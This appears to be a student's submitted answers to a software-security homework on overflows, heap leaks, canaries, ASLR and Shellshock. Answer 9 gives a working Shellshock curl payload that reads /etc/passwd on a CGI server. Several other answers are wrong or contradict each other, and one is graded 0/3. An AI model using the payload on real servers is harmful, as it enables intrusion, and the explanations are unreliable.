@@ -1,0 +1,68 @@
+1/10) Is the program leak20240716.c vulnerable to a buffer overflow of type stack smashing/control hijacking?
+(If yes why, if no why)
+
+NO, the program is not vulnerable to buffer overflow of type stack smashing/control hijacking because all buffers are properly managed within their boundaries. The code ensures that no out-of-bounds writing occurs. Specifically, we can observe that with the while loop there is the constraint of "index < (size-1)" to avoid this vulnerability. So, we are not overwhelming anything on the stack in this way.
+
+2/10) Is the program leak20240716.c vulnerable to an attack of type heap manipulation?
+(If yes why, if no why)
+
+NO, the program is not vulnerable to heap manipulation attack because "retval", which is allocated on the heap, is handled safely within its boundaries. In fact the "strcpy" function copy the contents of "src" into "retval" and it ensures that only the appropriate amount of data is copied because of the presence of NULL in buf[size-1], so "src" is null-terminated and there is no risk to copy more bytes that the allocated size.
+
+3/10) Is the program leak20240716.c vulnerable to an attack of type stack information exfiltration?
+(If yes why, if no why)
+
+NO, the program isn't vulnerable to stack information exfiltration because we are going to initialize a buffer with size=SIZE=16 with the for loop and then we use the same size in the "isThisVulnerable".
+In fact "malloc" will allocate memory with this size and in this way we will not risk to go beyond the bounds of the stack, so there is no stack information exfiltration.
+
+4/10) Is the program leak20240716.c vulnerable to an attack of type heap information exfiltration?
+(If yes why, if no why)
+
+YES, the program is vulnerable to heap information exfiltration because if the user choose "i" bigger than "size"(=SIZE=16), then the last for loop will print the contents of "result" up to "i" bytes, but "retval" has only "size" bytes of allocated memory,so with "i" greater  than "size" the loop prints uninitialized data and since "result" was allocated on the heap, any memory beyond the bounds of "retval" could contain sensitive information of the heap
+
+5/10) Is the program leak20240716.c vulnerable to any of the previously mentioned attacks if stack protectors (canaries) are in place?
+(If yes why, if no why)
+
+YES, in general the program remains vulnerable to heap manipulation and information exfiltration attacks even if stack protectors (canaries) are in place.
+The canaries guards against the buffer overflow of type stack smashing/control hijacking because when we are going to write out of the buffer size we trigger the canaries.
+So, even with canaries in place, the program is still vulnerable to heap information exfiltration attack. 
+
+[0/3]
+6/10) Modify the loop3-20240906.c program so that it loops. Give back the modified source file as part of your assignment. Explain why what you did is the right modification to achieve the goal.
+
+The main changes to create a looping program are:
+
+- Made loop function accept dim and theBuf as parameters.
+- Implemented recursion in loop with if (k < 1000) { loop(dim, theBuf); }.
+- Kept global k to count iterations, incrementing it each call.
+- In main, removed local k, added argument checking.
+- Used malloc for theBuf instead of a variable-length array.
+- Added free(theBuf) at the end of main.
+
+These changes work because recursion creates the loop, global k limits iterations to 1000, preventing infinite recursion and the parameters ensure correct data passage through recursive calls. At the end dynamic allocation improves memory management.
+The program now loops via recursion, with iteration control and proper memory handling.
+
+7/10) Can not executable stack prevent the return loop in loop3-20240906.c?
+(If yes why, if no why)
+
+NO, because the not executable stack prevents to execute code on the stack. However, in this program, there is no code execution on the stack. 
+Instead, there is a return to the loop insert, which this technique cannot prevent.
+
+8/10) Can stack protectors (canaries) prevent the return loop in loop3-20240906.c?
+(If yes why, if no why)
+
+NO, stack protectors (canaries) cannot prevent the return loop in this code. 
+The reason is that the code directly modifies the return address on the stack using the line *((int*)(&(buf[SIZE + 3]))) = &loop;, which bypasses the canary check entirely. Stack canaries are designed to detect buffer overflows that accidentally overwrite the return address, but in this case, the modification is intentional and occurs without triggering an overflow that would overwrite the canary. Since the canary remains intact and is not involved in the direct modification, it cannot prevent the return loop attack in this scenario.
+Additionally, if the stack layout changes due to the presence of a canary, the attacker might need to adjust the offset (e.g., use SIZE + 4 instead of SIZE + 3) to still target the return address and bypass the canary.
+
+9/10) Assume you know the address of a http server with the shellshock vulnerability and a myCommand CGI program available (in the default CGI-BIN folder).
+Write the curl command that makes an http request that exploits the shellshock vulnerability and executes the "cat /etc/passwd" command redirecting output to a /tmp/log.txt file
+
+curl -A "() { echo hello; }; echo Content-type: text/plain; echo; /bin/cat /etc/passwd > /tmp/log.txt" http://address/cgi-bin/myCommand.cgi
+
+10/10) Does ASLR protect from a return to libc attack?
+(If yes why, if no why)
+
+NO, ASLR does not protect against return to libc attacks.
+ret2libc need to know exact addresses of functions in memory. 
+While ASLR randomizes the addresses of executables to make them harder to predict, it doesn’t prevent attackers from finding the addresses of functions. 
+An attacker can still discover these addresses, often through techniques like multiple executions or other methods.
